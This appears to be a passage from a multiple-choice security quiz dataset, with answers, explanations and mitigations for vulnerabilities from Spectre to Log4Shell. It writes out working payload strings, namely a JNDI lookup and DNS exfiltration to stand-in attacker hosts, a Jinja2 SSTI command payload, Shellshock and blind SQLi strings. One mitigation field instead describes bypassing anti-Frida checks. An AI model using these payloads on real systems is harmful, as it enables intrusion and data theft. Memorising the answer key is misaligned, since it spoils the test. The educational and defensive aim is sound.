        (213, "What is 'ECDSA Nonce Reuse' vulnerability and what is the mathematical consequence?",
         ["Using the same ephemeral random value (k) to sign two different messages with the same private key allows an attacker to compute the private key instantly using simple modular arithmetic", "The digital signature becomes 100 times larger in byte size", "The signature verification takes 10 minutes to complete", "It converts the elliptic curve into an RSA key pair"],
         0, "In ECDSA, reusing the nonce 'k' across two signatures allows solving for the private key 'd = (s1*m2 - s2*m1) / (s2*r - s1*r) mod n' in milliseconds.", "Use deterministic ECDSA (RFC 6979) or Ed25519, where the nonce is generated deterministically from the private key and message hash."),

        (214, "What is 'Spectre' (Variant 1: Bounds Check Bypass, CVE-2017-5753) CPU vulnerability?",
         ["A microarchitectural side-channel flaw where speculative execution mispredicts conditional branches, speculatively reading out-of-bounds memory into CPU cache and leaking it via cache timing analysis (Flush+Reload)", "A physical ghost appearing on computer monitors", "A software virus that deletes operating system boot sectors", "A network routing loop in BGP routers"],
         0, "Spectre V1 tricks the CPU branch predictor into speculatively executing instructions that read out-of-bounds secrets into L1/L3 cache, measuring access latencies to recover data.", "Insert speculation barrier instructions (LFENCE on x86) after array bounds checks and compile with speculative load hardening."),

        (215, "What is 'Meltdown' (Variant 3: Rogue Data Cache Load, CVE-2017-5754) CPU vulnerability?",
         ["A hardware flaw where out-of-order execution allows user-space instructions to read arbitrary kernel memory before privilege violation checks trap, leaking kernel memory via cache side-channels", "A computer processor physically melting due to overheating", "A power supply explosion in server rooms", "A software bug in Python math libraries"],
         0, "Meltdown breaks the fundamental isolation between user applications and the operating system kernel by executing instructions speculatively past permission checks.", "Implement Kernel Page Table Isolation (KPTI / KVA Shadow) to unmap kernel memory while in user mode."),

        (216, "What is 'Rowhammer' attack on dynamic random-access memory (DRAM)?",
         ["Repeatedly and rapidly accessing specific rows of memory cells (hammering) to induce electrical charge leakage in adjacent rows, flipping bits in memory to gain root/hypervisor privileges", "Hitting physical RAM sticks with a hammer to break them", "A technique for accelerating memory overclocking", "Cleaning dust from memory motherboard slots with compressed air"],
         0, "Rowhammer induces hardware-level bit flips in adjacent physical DRAM rows, subverting software memory isolation and modifying page table entries without software bugs.", "Deploy Target Row Refresh (TRR) mitigations and Error-Correcting Code (ECC) memory modules in critical servers."),

        (217, "What is 'HTTP Request Smuggling' (CL.TE / TE.CL desynchronization)?",
         ["Exploiting discrepancies between how frontend reverse proxies and backend servers parse 'Content-Length' and 'Transfer-Encoding: chunked' headers to smuggle hidden HTTP requests into the backend stream", "Smuggling physical USB flash drives into a server room", "A method for downloading video files faster over HTTP", "Encrypting HTTP headers with AES-GCM"],
         0, "Request smuggling desynchronizes request boundaries on persistent HTTP connections, allowing attackers to hijack user requests, poison caches, or steal session tokens.", "Enforce HTTP/2 or HTTP/3 end-to-end and reject ambiguous HTTP/1.1 requests containing both Content-Length and Transfer-Encoding headers."),

        (218, "How does 'AWS IAM Privilege Escalation via iam:PassRole and ec2:RunInstances' work?",
         ["An attacker with limited permissions creates an EC2 instance, passes an existing high-privilege IAM role to it using iam:PassRole, and extracts the role credentials from the EC2 instance metadata service", "By brute-forcing the AWS root account password", "By physically breaking into an Amazon data center", "By submitting a fake AWS support ticket"],
         0, "iam:PassRole allows delegating an IAM role to a service. If the attacker can also launch instances (ec2:RunInstances), they can execute code on that instance to assume the attached administrative role.", "Restrict iam:PassRole permissions using strict resource-level ARNs and enforce Service Control Policies (SCPs)."),

        (219, "What is the difference between 'AWS IMDSv1' and 'AWS IMDSv2' regarding SSRF exploitation?",
         ["IMDSv1 allows simple HTTP GET requests without headers; IMDSv2 requires a session-oriented PUT request with 'X-aws-ec2-metadata-token-ttl-seconds' to obtain a secret token, defeating standard SSRF and WAF bypasses", "IMDSv1 is encrypted while IMDSv2 is unencrypted", "IMDSv2 is only available on Linux computers", "There is no difference between IMDSv1 and IMDSv2"],
         0, "Because standard SSRF exploits cannot forge arbitrary HTTP PUT headers in simple requests, IMDSv2 stops metadata credential theft dead in its tracks.", "Enforce IMDSv2 (HttpTokens=required) across 100% of AWS EC2 instances and set HopLimit=1."),

        (220, "What is 'Direct System Calls' (Syswhispers / Hell's Gate / Halo's Gate) technique in EDR evasion?",
         ["Invoking native Windows kernel syscalls directly in assembly (e.g. syscall / sysenter) rather than calling exported ntdll.dll wrapper APIs, bypassing user-mode inline API hooks placed by EDRs", "Calling tech support over a telephone", "A method for speeding up CPU graphics rendering", "A hardware cable connecting two computers"],
         0, "EDR solutions hook user-mode APIs in ntdll.dll (e.g. NtCreateThreadEx). Direct syscalls bypass ntdll entirely, executing the raw syscall instruction directly into kernel space.", "Deploy kernel-level behavioral monitoring (Event Tracing for Windows - ETW-Ti) and kernel callbacks to detect direct syscall execution."),

        (221, "What is 'ETW-Ti' (Event Tracing for Windows - Threat Intelligence) and why is it critical for modern EDRs?",
         ["A kernel-level telemetry provider (Microsoft-Windows-Threat-Intelligence) built into the Windows kernel that emits tamper-resistant events for memory allocation, process injection, and thread execution", "A software program for testing internet speeds", "An antivirus scanner for smartphones", "A tool for deleting temporary Windows files"],
         0, "ETW-Ti executes directly within the Windows kernel (ntoskrnl.exe), providing EDRs with unhookable visibility into process memory modifications and syscall executions.", "Ensure EDR solutions are registered as Protected Process Light (PPL) to receive ETW-Ti telemetry."),

        (222, "What is 'Process Hollowing' (RunPE) technique in stealth malware execution?",
         ["Creating a legitimate process in a suspended state (e.g. svchost.exe), unmapping (hollowing) its original code from virtual memory, writing malicious PE code into its address space, and resuming execution", "Carving physical hollow spaces inside computer cases", "Deleting unneeded background processes to save RAM", "An operating system optimization tool for games"],
         0, "Process hollowing hides malicious code execution under the guise of legitimate signed Windows executables, tricking basic process monitoring tools.", "Use EDR solutions that monitor NtUnmapViewOfSection and track image-path vs memory-descriptor discrepancies."),

        (223, "What is 'Early Bird APC Queue Code Injection'?",
         ["Creating a suspended target process, queuing an Asynchronous Procedure Call (APC) pointing to shellcode via NtQueueApcThread, and resuming the thread so the payload executes before the main entry point runs", "An early morning alarm clock application for PCs", "A method for launching video games at boot time", "A tool for cleaning computer hardware"],
         0, "Early Bird executes shellcode in the target process before security software initialization and before EDR hooks are fully injected.", "Employ kernel-level ETW-Ti telemetry to monitor NtQueueApcThread calls directed at suspended threads."),

        (224, "What is 'Module Stomping' (DLL Hollowing) in memory injection?",
         ["Loading a legitimate signed DLL from disk into a process and overwriting its .text executable section with malicious shellcode to evade unbacked memory scanner detections", "Stomping physically on a computer hard drive", "A tool for compressing DLL files on disk", "A software driver for computer mice"],
         0, "Memory scanners look for executable memory regions not backed by files on disk (MEM_PRIVATE). Module stomping writes shellcode over legitimate DLL memory (MEM_IMAGE) to appear backed by a valid file.", "Deploy memory scanners that compare in-memory executable sections against on-disk image hashes to detect modified bytes."),

        (225, "What is 'Type Confusion' vulnerability in modern JavaScript JIT engines (V8, SpiderMonkey)?",
         ["A vulnerability where the JIT compiler miscalculates or optimizes away type checks, treating an object in memory as a different incompatible type, creating 'addrof' and 'fakeobj' memory corruption primitives", "Typing the wrong letters on a physical keyboard", "A bug in font rendering software on websites", "A method for translating code into foreign languages"],
         0, "JIT optimization bugs allow attackers to construct arbitrary memory read/write primitives (addrof/fakeobj), leading to full browser sandbox escapes.", "Apply browser sandboxing and ensure rapid deployment of browser engine security patches."),

        (226, "What is 'Use-After-Free' (UAF) memory corruption vulnerability?",
         ["Accessing memory through a dangling pointer after the heap memory has been freed, allowing an attacker to overwrite heap structures and hijack execution flow when new data is allocated in that space", "Using free software after the trial period expires", "A software program for cleaning hard drives", "An operating system utility for managing RAM"],
         0, "UAF allows attackers to reclaim freed memory blocks with attacker-controlled objects, replacing function virtual method tables (vtable) to hijack the instruction pointer.", "Adopt memory-safe languages (Rust, Go), use smart pointers, and compile C/C++ with AddressSanitizer (ASan)."),

        (227, "What is 'Tcache Poisoning' in Linux glibc heap exploitation (ptmalloc)?",
         ["Overwriting the 'next' pointer of a freed chunk in the per-thread cache (tcache) bin to force subsequent malloc() calls to return an arbitrary attacker-chosen memory address", "Poisoning water supplies near computer data centers", "A software bug in Linux network drivers", "A tool for compressing Linux kernel modules"],
         0, "Tcache poisoning corrupts single-linked list pointers in glibc, granting arbitrary memory write primitives upon subsequent malloc allocations.", "Compile with modern glibc safe-linking mitigations and pointer encryption for heap bins."),

        (228, "What is 'Post-Quantum Cryptography' (PQC) and which NIST standardized algorithm replaces RSA for Key Encapsulation?",
         ["Cryptographic algorithms resistant to attacks by quantum computers (Shor's algorithm); NIST selected CRYSTALS-Kyber (ML-KEM) for general key encapsulation", "Cryptography that only works after the year 3000", "A method for building quantum computer processors", "An algorithm that encrypts files 1000 times faster on GPUs"],
         0, "Shor's algorithm running on a cryptographically relevant quantum computer will break RSA and ECC. NIST standardized lattice-based ML-KEM (Kyber) and ML-DSA (Dilithium) to replace them.", "Begin adopting hybrid TLS cipher suites combining X25519 with Kyber768 to defend against 'Harvest Now, Decrypt Later' adversaries."),

        (229, "What is 'Harvest Now, Decrypt Later' (HNDL) threat model?",
         ["Adversaries recording encrypted TLS network traffic today and storing it in bulk, intending to decrypt it in the future once sufficiently powerful quantum computers become available", "Harvesting agricultural crops using automated drones", "A method for downloading video files faster", "An automated backup system for databases"],
         0, "HNDL compromises high-value secrets with long-term classification lifespans (government intelligence, trade secrets) years before quantum hardware matures.", "Implement Post-Quantum hybrid key exchange in TLS channels for all high-value communications immediately."),

        (230, "What is 'BGP Route Hijacking' and how does RPKI (Resource Public Key Infrastructure) mitigate it?",
         ["Illegitimately announcing IP address prefixes to global BGP routers to intercept or blackhole internet traffic; RPKI cryptographically validates Route Origin Authorizations (ROAs) to reject unauthorized announcements", "Stealing physical BGP routers from data centers", "A software program for speeding up home internet", "A tool for configuring Wi-Fi router passwords"],
         0, "BGP hijacking diverts global traffic by broadcasting more specific or unauthorized Autonomous System (AS) routes. RPKI uses cryptographic ROAs to validate legitimate origin AS numbers.", "Enforce RPKI Route Origin Validation (ROV) on all border gateway routers."),

        (231, "What is 'Linux Kernel eBPF Rootkit' (e.g. Boopkit, BadBPF)?",
         ["A stealthy rootkit that utilizes Extended Berkeley Packet Filter (eBPF) programs attached to kernel tracepoints/kprobes to manipulate syscall arguments, hide processes, and filter network packets in kernel space", "A software driver for Linux sound cards", "A tool for compiling Linux kernel source code", "An open-source Linux video game"],
         0, "eBPF rootkits run directly in kernel memory without loading traditional out-of-tree kernel modules (.ko), making them invisible to standard lsmod and file-integrity scanners.", "Audit eBPF program loading with 'bpftool prog list' and restrict unprivileged eBPF execution via sysctl 'kernel.unprivileged_bpf_disabled=1'."),

        (232, "What is 'Blind SQL Injection via Out-of-Band (OOB) Exfiltration'?",
         ["Triggering database functions (e.g. UTL_HTTP in Oracle, master..xp_dirtree in MSSQL, LOAD_FILE() in MySQL) to perform DNS lookups to an attacker-controlled nameserver, exfiltrating data in DNS query subdomains", "Injecting SQL queries with the computer monitor turned off", "A tool for compressing SQL database tables", "An attack that only targets blind computer users"],
         0, "When applications return no data or error messages, OOB SQLi forces the database server to resolve DNS queries containing extracted data (e.g. data.attacker.com).", "Enforce strict outbound firewall rules on database servers preventing outbound UDP 53 and HTTP connections."),

        (233, "What is 'Active Directory Kerberos Unconstrained Delegation' vulnerability?",
         ["A computer account configured with unconstrained delegation stores a copy of every user's TGT ticket in its LSASS memory whenever they connect, allowing an attacker who compromises the host to extract TGTs and impersonate any user", "A method for delegating tasks to coworkers in Active Directory", "An error in Active Directory clock synchronization", "A software program for backing up domain controllers"],
         0, "If a Domain Admin connects to an unconstrained host, their full TGT is stored in memory, granting immediate domain compromise via Mimikatz.", "Eliminate unconstrained delegation; migrate to Kerberos Resource-Based Constrained Delegation (RBCD) and enable 'Account is sensitive and cannot be delegated'."),

        (234, "What is 'Resource-Based Constrained Delegation' (RBCD) attack in Active Directory?",
         ["An attacker who obtains write access to a target computer's 'msDS-AllowedToActOnBehalfOfOtherIdentity' attribute configures delegation from an attacker-controlled machine, leveraging S4U2Self/S4U2Proxy to gain SYSTEM access", "A tool for allocating RAM memory in servers", "A method for sharing printers across an office network", "An operating system formatting tool"],
         0, "RBCD abuse allows an attacker with write access over a computer object to forge service tickets to impersonate any domain user to that computer.", "Audit permissions on computer objects and monitor modifications to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute."),

        (235, "What is 'Format String Vulnerability' exploitation using '%n' specifier in C/C++?",
         ["The '%n' format specifier writes the number of characters printed so far into a memory address pointed to by the argument, enabling arbitrary memory write primitives to hijack execution pointers", "A tool for formatting hard drive partitions", "A software bug in word processing documents", "A method for printing text in colorful fonts"],
         0, "Unsanitized user format strings allow attackers to write arbitrary memory addresses using '%n' and dump stack memory using '%p' / '%x'.", "Never pass user input directly as format arguments (use printf(\"%s\", user_input)) and compile with '-Wformat-security -Werror=format-security'."),

        (236, "What is 'Time-of-Check to Time-of-Use' (TOCTOU) file race condition in privileged Linux daemons?",
         ["A concurrency vulnerability where a privileged process checks file permissions and then opens the file, but an unprivileged attacker replaces the file with a symlink (e.g. to /etc/shadow) in the brief time window between check and use", "A race between two computer clocks on a network", "A stopwatch application bug in operating systems", "A tool for synchronizing server timestamps"],
         0, "TOCTOU race conditions exploit non-atomic file operations. Attackers use tools like inotify or renameat2() to swap target files with symbolic links.", "Use atomic file descriptor operations (openat with O_NOFOLLOW, O_CREAT | O_EXCL, and fstat) instead of separate access() and open() calls."),

        (237, "What is 'Server-Side Template Injection' (SSTI) in Jinja2 / Python web applications leading to RCE?",
         ["Injecting payload syntax (e.g. {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}) that executes Python code inside the template engine environment to achieve remote shell execution", "A tool for designing website CSS themes", "An email formatting utility in web browsers", "A software program for compressing images"],
         0, "When template engines evaluate user input as code rather than data, attackers traverse Python's object hierarchy via '__globals__' and '__subclasses__' to instantiate arbitrary OS commands.", "Never concatenate user input directly into template strings; always pass user data as variables inside the render template context."),

        (238, "What is 'WPA3 SAE Dragonblood' vulnerability?",
         ["Side-channel timing and cache-based vulnerabilities in WPA3 Simultaneous Authentication of Equals (SAE) handshake hunting-and-pecking algorithm that allow attackers to recover the Wi-Fi password offline", "A video game about hunting digital dragons", "A physical attack on wireless router antennas", "A software tool for boosting Wi-Fi speeds"],
         0, "Dragonblood exploits timing and cache leaks in the SAE curve hunting-and-pecking loop, allowing recovery of the pre-shared key without capturing standard 4-way handshakes.", "Update WPA3 access point firmware to implement constant-time SAE hunting-and-pecking algorithms."),

        (239, "What is 'Anti-Debugging via PEB BeingDebugged and NtQueryInformationProcess' in Windows malware?",
         ["Techniques where malware inspects the Process Environment Block (PEB->BeingDebugged) or queries ProcessDebugPort to detect analysis environments and terminate or alter execution to thwart reverse engineering", "A software tool for debugging operating system crashes", "A hardware cable connecting two computers", "A program for cleaning computer motherboards"],
         0, "Malware queries debugging flags and measures execution timing (RDTSC instruction deltas) to evade sandbox detonation and reverse engineering.", "Use advanced debugger plugins (ScyllaHide, TitanEngine) to hook and disguise anti-debugging APIs during dynamic analysis."),

        (240, "What is 'Frida Dynamic Binary Instrumentation Detection' on Android?",
         ["Android apps inspecting '/proc/net/tcp' for listening port 27042, scanning memory maps for 'frida-gadget.so', or verifying native function checksums to prevent reverse engineers from hooking runtime methods", "A software tool for taking phone screenshots", "A battery diagnostic utility for smartphones", "An app for downloading wallpaper images"],
         0, "Hardened Android banking apps employ anti-Frida checks (scanning named pipes, D-Bus interfaces, and /proc/self/maps) to abort execution if dynamic hooking is detected.", "Bypass anti-hooking checks using native symbol renaming, custom Frida port bindings, or kernel-level hooking (KernelSU)."),

        (241, "What is 'OAuth 2.0 PKCE' (Proof Key for Code Exchange) and how does it secure public mobile/SPA clients?",
         ["The client generates a secret 'code_verifier' and sends its SHA-256 hash ('code_challenge') with authorization request; the token endpoint verifies the verifier before issuing tokens, preventing auth code interception attacks", "A physical key used to unlock office doors", "A method for encrypting email attachments", "A software driver for computer trackpads"],
         0, "PKCE protects public clients (which cannot safely store a client_secret) from having authorization codes intercepted by malicious apps registered to the same custom URI scheme.", "Enforce PKCE (RFC 7636) unconditionally for all OAuth 2.0 and OpenID Connect authorization code flows."),

        (242, "What is 'Blind SSRF' targeting Kubernetes Kubelet API (:10250) or internal metadata?",
         ["Tricking an internal cloud container into sending requests to 'https://kubernetes.default.svc' or 'http://169.254.169.254' to extract service account JWT tokens mounted at '/var/run/secrets/kubernetes.io/serviceaccount/token'", "An attack on computer monitors in data centers", "A tool for compressing Kubernetes container images", "A software program for managing cloud billing"],
         0, "SSRF inside Kubernetes pods can access the internal Kubelet API or metadata service to harvest ServiceAccount bearer tokens, leading to cluster privilege escalation.", "Implement NetworkPolicies restricting pod egress traffic to internal metadata and API endpoints."),

        (243, "What is 'Kubernetes RBAC Privilege Escalation via impersonate / bind / escalate' permissions?",
         ["A misconfigured role granting 'impersonate' on users/serviceaccounts or 'bind'/'escalate' on clusterroles, allowing a low-privilege service account to grant itself cluster-admin privileges", "A hardware failure in Kubernetes worker nodes", "A method for restarting frozen Docker containers", "A software driver for cloud load balancers"],
         0, "Permissions like 'escalate', 'bind', or 'impersonate' allow users to bypass RBAC restrictions and bind the 'cluster-admin' role to themselves.", "Audit Kubernetes RBAC bindings with tools like 'kube-hunter' and eliminate wildcard ('*') verbs on RBAC resources."),

        (244, "What is 'Linux Capabilities' privilege escalation via 'cap_setuid' or 'cap_dac_override'?",
         ["Binaries assigned fine-grained Linux capabilities (e.g. setcap cap_setuid+ep /usr/bin/python) allow unprivileged users executing that binary to change UID to 0 (root) and gain full system takeover", "A tool for measuring computer processing capacity", "A software program for formatting Linux hard drives", "A method for organizing Linux desktop icons"],
         0, "Capabilities grant subsets of root power; setting 'cap_setuid' on script interpreters allows any user to spawn an interactive root shell.", "Audit capabilities using 'getcap -r / 2>/dev/null' and eliminate dangerous capabilities on non-standard binaries."),

        (245, "What is 'Dirty COW' (CVE-2016-5195) Linux kernel vulnerability?",
         ["A race condition in the Linux kernel memory subsystem copy-on-write (COW) breakage mechanism that allows unprivileged local users to write to read-only memory mappings (e.g. /etc/passwd)", "A farm animal infected with digital viruses", "A software bug in Linux printing drivers", "A tool for cleaning physical server motherboards"],
         0, "Dirty COW allowed unprivileged users to overwrite read-only root files by exploiting a race condition between madvise(MADV_DONTNEED) and write() on COW memory.", "Apply upstream Linux kernel security patches and maintain updated kernel versions across production servers."),

        (246, "What is 'Dirty Pipe' (CVE-2022-0847) Linux kernel vulnerability?",
         ["A flaw in the Linux kernel pipe buffer handling where uninitialized pipe buffer flags allow unprivileged users to overwrite arbitrary data in read-only files backed by page cache (e.g. /etc/shadow)", "A plumbing leak in a computer server room", "A software bug in Linux audio drivers", "A tool for compressing data over network cables"],
         0, "Dirty Pipe allows local privilege escalation by injecting data directly into the page cache of arbitrary read-only files without write permissions.", "Update Linux kernels to versions 5.16.11, 5.15.25, 5.10.102 or higher."),

        (247, "What is 'SUDO Baron Samedit' (CVE-2021-3156) vulnerability?",
         ["A heap-based buffer overflow in Sudo when parsing command line arguments in sudoedit with trailing backslashes ('sudoedit -s \\'), allowing any local unprivileged user to gain root privileges", "A title given to high-ranking IT managers", "A software program for editing text files", "A tool for managing server passwords"],
         0, "Baron Samedit allowed local users to overflow heap memory in sudoers parsing, altering internal data structures to achieve root execution without knowing passwords.", "Ensure the 'sudo' package is patched to version 1.9.5p2 or newer across all Linux distributions."),

        (248, "What is 'Polkit PwnKit' (CVE-2021-4034) vulnerability in Linux?",
         ["A memory corruption vulnerability in Polkit's 'pkexec' utility when argc is 0, allowing an unprivileged local user to force pkexec to execute environment variables as code and gain root privileges", "A gaming toolkit for Linux video games", "A software driver for computer keyboards", "A tool for cleaning hard drive partitions"],
         0, "PwnKit exploited pkexec's parameter handling to execute arbitrary libraries from unprivileged environments, granting instant root access across default Linux installations.", "Update polkit packages or remove the SUID bit from /usr/bin/pkexec ('chmod 0755 /usr/bin/pkexec') as a temporary mitigation."),

        (249, "What is 'Windows PrintNightmare' (CVE-2021-34527 / CVE-2021-1675) vulnerability?",
         ["A critical Remote Code Execution flaw in the Windows Print Spooler service (spoolsv.exe) that allows authenticated domain users to remotely inject and execute malicious printer drivers with SYSTEM privileges", "A computer printer running out of paper", "A software program for formatting PDF files", "An error in physical printer hardware cables"],
         0, "PrintNightmare allowed any domain user to execute SYSTEM code on remote Windows Domain Controllers via RPC calls to AddPrinterDriverEx.", "Disable the Print Spooler service on all Domain Controllers and critical non-print servers."),

        (250, "What is 'ZeroLogon' (CVE-2020-1472) Active Directory vulnerability?",
         ["A cryptographic flaw in Netlogon AES-CFB8 implementation where sending all-zero client challenges forces the session key to compute to all zeros, allowing attackers to reset the Domain Controller computer password to blank", "A feature that logs users in in zero seconds", "A software tool for creating domain controllers", "A method for encrypting passwords in Active Directory"],
         0, "ZeroLogon exploited insecure AES-CFB8 initialization vectors (fixed to all-zeros), allowing an unauthenticated network attacker to hijack Domain Controllers in 3 seconds.", "Enforce secure Netlogon channel binding across all Active Directory Domain Controllers."),

        (251, "What is 'NoPAC' (CVE-2021-42287 / CVE-2021-42278) Active Directory vulnerability?",
         ["Exploiting computer name spoofing (omitting '$') and requesting a Kerberos TGT without a PAC, then renaming the machine to a DC name before requesting a TGS, causing the KDC to issue a Domain Admin ticket", "A PAC-MAN video game cheat code", "A tool for deleting computer accounts in Active Directory", "A software program for managing network cables"],
         0, "NoPAC allowed standard domain users to elevate to Domain Admin in seconds by exploiting machine account name validation discrepancies during TGS issuance.", "Apply Microsoft security updates KB5008102 and KB5008380 to all Domain Controllers."),

        (252, "What is 'Follina' (CVE-2022-30190) Microsoft Office / MSDT vulnerability?",
         ["A remote code execution flaw where a malicious Office document invokes Microsoft Support Diagnostic Tool (msdt.exe) via the 'ms-msdt:' URI scheme to execute PowerShell commands even if macros are disabled", "A typography font used in Microsoft Word", "A tool for organizing Excel spreadsheets", "A software program for repairing corrupted hard drives"],
         0, "Follina executed arbitrary code via HTML/URI protocol handlers without requiring VBA macro activation or user interaction past opening the document.", "Disable the MSDT URL protocol handler in the Windows registry ('reg delete HKEY_CLASSES_ROOT\\ms-msdt /f')."),

        (253, "What is 'ProxyLogon' (CVE-2021-26855) Microsoft Exchange Server vulnerability chain?",
         ["An SSRF vulnerability in Microsoft Exchange Frontend that allows unauthenticated attackers to bypass authentication and execute arbitrary commands on backend Exchange services via backend PowerShell endpoints", "A proxy server used for browsing the internet", "A tool for creating email accounts in bulk", "A software program for backing up email databases"],
         0, "ProxyLogon combined pre-auth SSRF with post-auth arbitrary file write vulnerabilities to drop web shells on unpatched on-premises Exchange servers globally.", "Apply cumulative security updates to on-premises Microsoft Exchange servers and restrict Exchange management ports from external internet access."),

        (254, "What is 'ProxyShell' Microsoft Exchange vulnerability chain?",
         ["A chain of three vulnerabilities (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) allowing pre-auth path confusion, privilege escalation to SYSTEM, and arbitrary web shell upload via Exchange PowerShell backend", "A computer shell casing made of aluminum", "A software driver for computer printers", "A method for sending automated emails"],
         0, "ProxyShell allowed unauthenticated remote code execution by exploiting path confusion in Exchange Autodiscover URLs to execute arbitrary PowerShell cmdlets.", "Keep on-premises Exchange servers updated and isolate autodiscover and PowerShell virtual directories from public internet exposure."),

        (255, "What is 'Log4j / JNDI Injection' technical exploitation mechanism?",
         ["The logger evaluates '${jndi:ldap://attacker.com/obj}' strings, connects to the remote LDAP server, downloads a serialized Java class file, and instantiates it into memory, triggering arbitrary RCE", "A tool for formatting log files on servers", "An error in Java garbage collection", "A software program for cleaning hard drives"],
         0, "Log4Shell weaponized Java Naming and Directory Interface (JNDI) lookups to load remote untrusted Java bytecode into the application JVM process.", "Update Log4j to version 2.17.1+ and set JVM flag '-Dlog4j2.formatMsgNoLookups=true'."),

        (256, "What is 'Spring4Shell' (CVE-2022-22965) vulnerability in Spring Framework?",
         ["An RCE vulnerability where HTTP parameter binding allows attackers to access the 'class' loader property (class.module.classLoader), altering Tomcat logging properties to write an executable JSP web shell to disk", "A spring used inside computer mechanical keyboards", "A software tool for designing website themes", "A method for speeding up Java server execution"],
         0, "Spring4Shell exploited data binding mechanisms on Java 9+ running on Apache Tomcat to overwrite AccessLogValve configurations and drop web shells.", "Update Spring Framework to versions 5.3.18 / 5.2.20 or newer and restrict parameter binding patterns."),

        (257, "What is 'OpenSSL Heartbleed' (CVE-2014-0160) vulnerability?",
         ["A missing bounds check in the OpenSSL TLS Heartbeat extension implementation that allows remote attackers to read 64KB of server process memory per request, leaking private SSL keys and passwords", "A medical condition in computer technicians", "A software tool for testing internet bandwidth", "A hardware defect in server power cables"],
         0, "Heartbleed allowed unauthenticated attackers to read arbitrary heap memory chunks from vulnerable servers by sending forged heartbeat length fields.", "Disable TLS Heartbeat extension and update OpenSSL packages to patched releases."),

        (258, "What is 'Shellshock' (CVE-2014-6271) GNU Bash vulnerability?",
         ["A flaw where GNU Bash improperly processes trailing function definitions in environment variables (e.g. '() { :;}; /bin/id'), executing arbitrary commands when spawned by web CGI scripts or SSH", "A physical electric shock from computer cases", "A software driver for computer mice", "An operating system formatting tool"],
         0, "Shellshock allowed remote attackers to execute arbitrary commands by passing crafted function definitions in HTTP headers to web servers running legacy CGI scripts.", "Patch GNU Bash to modern versions and deprecate legacy CGI script architectures."),

        (259, "What is 'EternalBlue' (MS17-010 / CVE-2017-0144) exploit used in WannaCry ransomware?",
         ["A remote code execution vulnerability in Microsoft SMBv1 protocol handling of Srv!SmbOs2FeaToNt transaction structures, allowing unauthenticated ring-0 kernel code execution over port 445", "A blue desktop wallpaper on Windows PCs", "A tool for formatting hard drives over networks", "A software program for connecting wireless headphones"],
         0, "EternalBlue weaponized SMBv1 buffer overflows to propagate WannaCry and NotPetya ransomware across enterprise networks autonomously in seconds.", "Disable SMBv1 completely and apply Microsoft patch MS17-010 across all Windows systems."),

        (260, "What is 'BlueKeep' (CVE-2019-0708) Remote Desktop vulnerability?",
         ["A pre-authentication Remote Code Execution vulnerability in Windows Remote Desktop Services (RDP) caused by use-after-free in termdd.sys when handling channel bindings", "A blue metal lock for server racks", "A software tool for cleaning computer monitors", "A program for recording desktop videos"],
         0, "BlueKeep allowed unauthenticated remote attackers to execute kernel-level code over RDP port 3389 without user interaction (wormable).", "Enable Network Level Authentication (NLA) on RDP and apply Microsoft security update KB4499175."),

        (261, "What is 'Curve25519 / Ed25519' in modern high-performance cryptography?",
         ["An elliptic curve offering 128-bit security level designed by Daniel J. Bernstein, resistant to side-channel timing attacks and immune to small subgroup attacks by design", "A road curve in California where tech companies operate", "A software driver for graphics cards", "A tool for compressing video files"],
         0, "Ed25519 provides fast signature generation and verification while mathematically avoiding timing attacks and weak curve parameters.", "Adopt Ed25519 for SSH keys, digital signatures, and secure protocol development."),

        (262, "What is 'Constant-Time Cryptographic Implementation' and why is it essential?",
         ["Writing cryptographic algorithms such that code execution paths and memory access times are completely independent of secret key values, preventing timing side-channel attacks", "A computer clock that never runs out of battery", "An algorithm that finishes execution in exactly 1 millisecond", "A software tool for synchronizing server timestamps"],
         0, "Non-constant-time crypto leaks private key bits through minute variations in execution duration or CPU cache hits/misses.", "Use audited constant-time primitives (e.g. crypto_verify, constant_time_compare) for cryptographic comparisons."),

        (263, "What is 'Blind SQLi via Binary Search Time Delays'?",
         ["An attacker using conditional delays (e.g. IF(ASCII(SUBSTRING(password,1,1))>100, SLEEP(5), 0)) to infer database characters using binary search in logarithmic time", "Injecting SQL queries with closed eyes", "A software tool for searching images in databases", "An error in database index clustering"],
         0, "Binary search reduces the number of HTTP requests required to extract each character from ~128 linear queries to ~7 binary queries.", "Use parameterized queries / prepared statements unconditionally across all application tiers."),

        (264, "What is 'GraphQL Introspection Query Abuse' in web API reconnaissance?",
         ["Querying the '__schema' meta-field in GraphQL to retrieve the entire API schema, types, queries, mutations, and hidden fields exposed by the backend", "A meditation application for web developers", "A tool for compressing GraphQL responses", "A software program for designing website layouts"],
         0, "Introspection reveals unreleased internal administrative queries, undocumented mutations, and hidden backend data relationships.", "Disable GraphQL schema introspection in production environments."),

        (265, "What is 'GraphQL Batching Attack' (Brute Force Amplification)?",
         ["Sending a single HTTP POST request containing hundreds of batched GraphQL query mutations (e.g. login(user:\"admin\", pass:\"...\")), bypassing standard HTTP rate limiters", "Batching physical cables behind server racks", "A tool for converting GraphQL into SQL", "An error in database query caching"],
         0, "Batching allows attackers to test thousands of credentials or OTPs in a single HTTP transaction, evading per-request rate-limiting rules.", "Enforce GraphQL query depth limiting, complexity analysis, and batched operation throttling on GraphQL gateways."),

        (266, "What is 'CORS Null Origin Exploitation'?",
         ["When a web server trusts 'Origin: null', an attacker can trigger cross-origin requests from sandboxed iframes or data: URIs to steal private user API data", "A software bug where website backgrounds turn black", "A tool for deleting invalid domain names", "An error in computer memory allocation"],
         0, "Sandboxed iframes and local files send 'Origin: null'. Servers that whitelist 'null' inadvertently allow arbitrary third-party web pages to steal sensitive user responses.", "Never include 'null' in the 'Access-Control-Allow-Origin' whitelist header."),

        (267, "What is 'Prototype Pollution' in JavaScript / Node.js applications?",
         ["An injection vulnerability where an attacker manipulates '__proto__' or 'constructor.prototype' properties to inject malicious properties into Object.prototype, altering all application objects and causing DoS or RCE", "Polluting physical computer cleanrooms with dust", "A software tool for cleaning JavaScript code", "An error in CSS prototype design"],
         0, "Prototype pollution modifies base JavaScript objects, leading to property injection, authentication bypasses, or RCE via gadget chains in popular libraries.", "Use Object.create(null), Object.freeze(Object.prototype), or validate recursive object merge operations against dangerous keys."),

        (268, "What is 'Node.js Deserialization Vulnerability' (e.g. node-serialize)?",
